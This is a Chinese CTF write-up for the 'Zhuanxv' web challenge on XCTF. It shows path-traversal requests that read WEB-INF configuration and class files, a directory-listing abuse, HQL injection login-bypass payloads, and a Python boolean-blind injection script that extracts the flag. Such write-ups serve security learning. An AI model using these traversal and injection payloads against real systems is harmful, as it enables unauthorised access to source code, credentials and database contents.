## Zhuanxv

题目地址：

https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4682&page=2

看到JSESSIONID,得知是java写的web应用,

所以想办法读取配置文件web.xml

gobuster 扫到/list

css中获取图片方法

```
/loadimage?fileName=web_login_bg.jpg
```

看是否有LFI

关键是WEB-INF目录

> WEB-INF目录的作用
>
> - /WEB-INF/web.xml
>   Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
>
> - /WEB-INF/classes/
>   包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。
>
> - /WEB-INF/lib/
>   存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。
>
> - /WEB-INF/src/
>   源码目录，按照包名结构放置各个Java文件。
>
> - /WEB-INF/database.properties
>   数据库配置文件
>
> - /WEB-INF/tags/
>   存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：<%@ taglibprefix="tags" tagdir="/WEB-INF /simpleTags" % >。
>
> - /WEB-INF/jsp/
>   jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。
>
> - WEB-INF/jsp2/
>   与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。
>
> - META-INF
>   相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。
>
>   ————————————————
>   版权声明：本文为CSDN博主「meijory」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。
>   原文链接：https://blog.csdn.net/meijory/article/details/53573140

拿到web.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app id="WebApp_9" version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
    <display-name>Struts Blank</display-name>
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <welcome-file-list>
        <welcome-file>/ctfpage/index.jsp</welcome-file>
    </welcome-file-list>
    <error-page>
        <error-code>404</error-code>
        <location>/ctfpage/404.html</location>
    </error-page>
</web-app>
```

发现用的是Struct2框架

读一下struct.xml

```
loadimage?fileName=../../WEB-INF/classes/struts.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.3//EN"
        "http://struts.apache.org/dtds/struts-2.3.dtd">
<struts>
	<constant name="strutsenableDynamicMethodInvocation" value="false"/>
    <constant name="struts.mapper.alwaysSelectFullNamespace" value="true" />
    <constant name="struts.action.extension" value=","/>
    <package name="front" namespace="/" extends="struts-default">
        <global-exception-mappings>
            <exception-mapping exception="java.lang.Exception" result="error"/>
        </global-exception-mappings>
        <action name="zhuanxvlogin" class="com.cuitctf.action.UserLoginAction" method="execute">
            <result name="error">/ctfpage/login.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
        <action name="loadimage" class="com.cuitctf.action.DownloadAction">
            <result name="success" type="stream">
                <param name="contentType">image/jpeg</param>
                <param name="contentDisposition">attachment;filename="bg.jpg"</param>
                <param name="inputName">downloadFile</param>
            </result>
            <result name="suffix_error">/ctfpage/welcome.jsp</result>
        </action>
    </package>
    <package name="back" namespace="/" extends="struts-default">
        <interceptors>
            <interceptor name="oa" class="com.cuitctf.util.UserOAuth"/>
            <interceptor-stack name="userAuth">
                <interceptor-ref name="defaultStack" />
                <interceptor-ref name="oa" />
            </interceptor-stack>

        </interceptors>
        <action name="list" class="com.cuitctf.action.AdminAction" method="execute">
            <interceptor-ref name="userAuth">
                <param name="excludeMethods">
                    execute
                </param>
            </interceptor-ref>
            <result name="login_error">/ctfpage/login.jsp</result>
            <result name="list_error">/ctfpage/welcome.jsp</result>
            <result name="success">/ctfpage/welcome.jsp</result>
        </action>
    </package>
</struts>
```

根据action里的信息下载对应源码

```
loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class
```

```java
public class DownloadAction
  extends ActionSupport
{
  ...
  public InputStream getDownloadFile() throws Exception { return ServletActionContext.getServletContext().getResourceAsStream("/ctfpage/images/" + this.fileName); }
  public String execute() throws Exception {
    String suffix = this.fileName.substring(this.fileName.lastIndexOf(".") + 1);
    if (!suffix.equals("xml") && !suffix.equals("jpg") && !suffix.equals("class")) {
      return "suffix_error";
    }
    return "success";
  }
  ...
}
```

可以看到只允许下载.xml，.jpg，.class文件

在UserLoginAction.class

```java
  public boolean isValid(String username) {
    String valiidateString = "[a-zA-Z0-9]{1-16}";
    return matcher(valiidateString, username);
  }
```

看到username只能1-16数字字母,无法注入，password试了一下万能密码也不行....

关键我们还是不知道后台登陆是怎么查数据库的...

刚才的点fuzz一下还可找到另个文件**applicationContext.xml**

Spring的核心配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName">
            <value>com.mysql.jdbc.Driver</value>
        </property>
        <property name="url">
            <value>jdbc:mysql://localhost:3306/sctf</value>
        </property>
        <property name="username" value="root"/>
        <property name="password" value="root" />
    </bean>
    <bean id="sessionFactory" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
        <property name="dataSource">
            <ref bean="dataSource"/>
        </property>
        <property name="mappingLocations">
            <value>user.hbm.xml</value>
        </property>
        <property name="hibernateProperties">
            <props>
                <prop key="hibernate.dialect">org.hibernate.dialect.MySQLDialect</prop>
                <prop key="hibernate.show_sql">true</prop>
            </props>
        </property>
    </bean>
    <bean id="hibernateTemplate" class="org.springframework.orm.hibernate3.HibernateTemplate">
        <property name="sessionFactory">
            <ref bean="sessionFactory"/>
        </property>
    </bean>
    <bean id="transactionManager" class="org.springframework.orm.hibernate3.HibernateTransactionManager">
        <property name="sessionFactory">
            <ref bean="sessionFactory"/>
        </property>
    </bean>
    <bean id="service" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean" abstract="true">
        <property name="transactionManager">
            <ref bean="transactionManager"/>
        </property>
        <property name="transactionAttributes">
            <props>
                <prop key="add">PROPAGATION_REQUIRED</prop>
                <prop key="find*">PROPAGATION_REQUIRED,readOnly</prop>
            </props>
        </property>
    </bean>
    <bean id="userDAO" class="com.cuitctf.dao.impl.UserDaoImpl">
        <property name="hibernateTemplate">
            <ref bean="hibernateTemplate"/>
        </property>
    </bean>
    <bean id="userService" class="com.cuitctf.service.impl.UserServiceImpl">
        <property name="userDao">
            <ref bean="userDAO"/>
        </property>
    </bean>
</beans>
```

泄露出更多的class名称

可以看到之前的isValid并没有使用

```java
//waf  注意只进行了password_matcher.find()
public List<User> loginCheck(String name, String password) {
    name = name.replaceAll(" ", "");
    name = name.replaceAll("=", "");
    Matcher username_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(name);
    Matcher password_matcher = Pattern.compile("^[0-9a-zA-Z]+$").matcher(password);
    if (password_matcher.find()) {
      return this.userDao.loginCheck(name, password);
    }
    return null;
  }

//HQL语句
public class UserDaoImpl
  extends HibernateDaoSupport
  implements UserDao
{
  public List<User> findUserByName(String name) { return getHibernateTemplate().find("from User where name ='" + name + "'"); }
  
  public List<User> loginCheck(String name, String password) { return getHibernateTemplate().find("from User where name ='" + name + "' and password = '" + password + "'"); }
}
```

这里要进行HQL注入

无空格->```/**/```或换行符(不知道为啥这里的```/**/```不行换换行符就可了...) 

无等号->or''like''或者‘1’>'0'

根据**表达式从右至左结合**的规则有payload

```sql
user.name='or''like''or''like'&user.password=1
->
from User where name =''or''like''or''like'' and password = '1'

或
user.name=admin'or'1'>'0'or%0Aname%0Alike'admin&user.password=1
->
from User where name ='admin'or'1'>'0'or
name
like'admin' and password = '1'
```

成功登陆后台，但是没啥用....页面是写死的。。。。

这里要用到布尔盲注....

payload1中控制是否成功登陆的是第一个条件

利用```'<hql>'like'<c>'```来爆破字段

写脚本

```python
# payload="user.name=admin'or(select%0aascii(substr(welcometoourctf,1,1))from%0aFlag%0a)like'115'or%0aname%0alike'admin&user.password=1"

#coding=utf-8
from pwn import *

import requests

url="http://111.198.29.45:53297/zhuanxvlogin"

flag =""
for i in range(1,50):
    for c in range(30,150):
        ch = chr(c)
        if ch == '_' or ch == '%':
            continue
        sql="(select\nascii(substr(welcometoourctf," + str(i) + ",1))\nfrom\nFlag\n)"
        username = "admin'or" + sql + "like'" + str(c) + "'or\nname\nlike'admin"
        password = "1"
        data = {"user.name" : username , "user.password" : password}
        #print data
        req = requests.post(url,data=data,timeout=10000).text
        if len(req) > 4000:
            flag = flag +ch
            print ("Flag:"+flag)
            break
```

很奇怪的是不知道为啥必须要用ascii码来like,并且要用第二个payload来组装数据

关于welcometoourctf和Flag是哪来的

还记得之前的list吗

```java
  public class AdminAction
  extends ActionSupport {
  private String pathName;
  
  public String execute() throws Exception {
    if (this.pathName == null) {
      return "list_error";
    }
    travelDirectory(this.pathName);
    return "success";
  }

  
  public void setPathName(String pathName) { this.pathName = pathName; }

  
  public void travelDirectory(String directory) {
    List<String> fileList = new ArrayList<String>();
    File dir = new File(directory);
    if (dir.isFile())
      return;  File[] files = dir.listFiles();
    ActionContext actionContext = ActionContext.getContext();
    Map<String, Object> request = (Map)actionContext.get("request");
    if (files != null) {
      for (int i = 0; i < files.length; i++) {
        fileList.add(files[i].getName());
        System.out.println(files[i].getName());
      } 
      request.put("fileList", fileList);
    } else {
      System.out.println("目录错误");
      request.put("error", "目录输入错误");
    } 
  }
}
```

可以读目录,fuzz一下，在

```
list?pathName=/opt/tomcat/webapps/ROOT/WEB-INF/classes
```

下找到user.hbm.xml

```xml
<?xml version="1.0"?>
<!DOCTYPE hibernate-mapping PUBLIC
        "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
        "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd">
<hibernate-mapping package="com.cuitctf.po">
    <class name="User" table="hlj_members">
        <id name="id" column="user_id">
            <generator class="identity"/>
        </id>
        <property name="name"/>
        <property name="password"/>
    </class>
    <class name="Flag" table="bc3fa8be0db46a3610db3ca0ec794c0b">
        <id name="flag" column="welcometoourctf">
            <generator class="identity"/>
        </id>
        <property name="flag"/>
    </class>
</hibernate-mapping>
```

### 参考资料

struct2 action详解:

https://blog.csdn.net/bestmy/article/details/81068026

大佬的wp:

https://www.guildhab.top/?p=648